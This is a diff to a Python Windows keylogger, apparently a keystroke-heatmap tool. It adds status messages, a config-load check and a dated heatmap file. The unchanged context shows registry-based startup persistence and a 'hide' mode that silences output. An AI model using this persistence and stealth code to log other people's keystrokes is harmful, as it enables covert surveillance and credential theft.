@@ -31,7 +31,7 @@ heatmap_order = []
 # Paused logging
 paused = False
 
-# Read confgi from json file
+# Read config from json file
 def read_config():
     config_path = join(DIR_PATH, CONFIG_FILE)
     # Check file exist and is not empty
@@ -45,7 +45,12 @@ def read_config():
         return False
 
 # Read the configurarion
-read_config()
+if read_config():
+    if not config["hide"]:
+        print("Successfully load configuration.")
+else:
+    print("Failed load configuration.")
+    exit()
 
 # Disallowing multiple instances with same prefix
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + config["file-prefix"])
@@ -64,8 +69,11 @@ def add_to_startup():
 
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
+        if not config["hide"]:
+            print("Keylogger applied to startup.")
     except Exception as e:
         if not config["hide"]:
+            print("Error occurred while applying keylogger to startup:")
             print(e)
 
 # Remove from startup 
@@ -75,9 +83,11 @@ def remove_from_startup():
 
     try:
         DeleteValue(key2change, LOGGER_NAME)  
+        if not config["hide"]:
+            print("Keylogger removed from startup.")
     except Exception as e:
         if not config["hide"]:
-            print(e, ". Not critical if logger isn't applied to startup")
+            print("No keylogger is applied to startup.")
 
 # Debug logger
 def log_debug():
@@ -239,12 +249,14 @@ def pause_logging():
     paused = not paused
 
 def read_heatmap():
-    path = join(DIR_PATH, BOOK_PATH)
-    file = join(path, (("" if config["file-prefix"] == "" else config["file-prefix"] + "_") + "heatmap.json"))
+    path = join(DIR_PATH, os.pardir, BOOK_PATH)
+    file = join(path, (("" if config["file-prefix"] == "" else config["file-prefix"] + "_") + "heatmap_" + date.today().strftime('%Y-%m-%d') + ".json"))
     if exists(file) and not os.stat(file).st_size == 0:
         with open(file, "r") as read_file:
             global heatmap_buffer
             heatmap_buffer = json.load(read_file)
+            return True
+    return False    
 
 def hide():
     if not config["output"] == 'debug':
@@ -283,6 +295,9 @@ if __name__ == '__main__':
         remove_from_startup()
 
     # Read already saved values 
-    read_heatmap()
+    if read_heatmap():
+        print("Loaded existing heatmap.")
+    else:
+        print("No Heatmap for today exist. Will be created.")
 
     main()
